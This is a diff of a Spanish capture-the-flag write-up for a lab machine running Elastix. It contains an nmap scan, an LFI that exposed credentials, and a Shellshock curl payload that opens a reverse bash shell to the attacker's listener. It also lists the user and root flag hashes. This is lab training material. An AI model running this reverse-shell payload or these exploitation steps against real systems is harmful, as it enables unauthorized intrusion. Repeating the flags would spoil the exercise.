@@ -13,20 +13,20 @@ En este caso debido a que la cantidad de puertos es enorme vamos a realizar ambo
 nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn 10.129.183.206 -sC -sV -oN targeted
 ```
 
-![[ 20250719135701.png]]
-![[ 20250719135718.png]]
+![[ 20250719135701.png]](beep-images/20250719135701.png)
+![[ 20250719135718.png]](beep-images/20250719135718.png)
 
 # Puerto 80
 
 >(Al principio puede dar fallo la pagina web, recomendación: poner en la URL "about:config" y en la barrita de búsqueda "security.tls.version.min" )
 
-![[ 20250719142158.png]]
+![[ 20250719142158.png]](beep-images/20250719142158.png)
 
 >con estos cambios no debería haber problema
 
 como siempre que una maquina tiene un puerto 80 con http / https abiertos empezamos por aqui 
 
-![[ 20250719135953.png]]
+![[ 20250719135953.png]](beep-images/20250719135953.png)
 
 vemos esta pagina web de elastix
 
@@ -41,9 +41,9 @@ es un LFI que segun exploitDB el vector de ataque seria:
 probamos a inyectar esto en la pagina web 
 
 
-![[ 20250719140246.png]]
+![[ 20250719140246.png]](beep-images/20250719140246.png)
 
-![[ 20250719140400.png]]
+![[ 20250719140400.png]](beep-images/20250719140400.png)
 
 podemos ver líneas interesantes con usuarios y contraseñas
 
@@ -62,7 +62,7 @@ en nuestra maquina atacante abrimos un puerto de escucha con nc
 nc -nlvp 4444
 ```
 
-![[ 20250719141259.png]]
+![[ 20250719141259.png]](beep-images/20250719141259.png)
 
 y mientras estamos en escucha lanzamos el ataque shellshock 
 
@@ -74,7 +74,7 @@ curl --tlsv1.0 --tls-max 1.0 -k -A "() { :; }; /bin/bash -i >& /dev/tcp/10.10.14
 
 tenemos shell como root 
 
-![[ 20250719141324.png]]
+![[ 20250719141324.png]](beep-images/20250719141324.png)
 
 # Tratamiento de Shell
 
@@ -110,13 +110,13 @@ una vez tenemos la shell practica vamos a por las flags
 
 ## user
 
-![[ 20250719141718.png]]
+![[ 20250719141718.png]](beep-images/20250719141718.png)
 
 user :  f39e9e4509649148e06e50b0e2a1a5cd
 
 ## root
 
-![[ 20250719141808.png]]
+![[ 20250719141808.png]](beep-images/20250719141808.png)
 
 root : 06673369bab439c578238b14b27fbc96
 
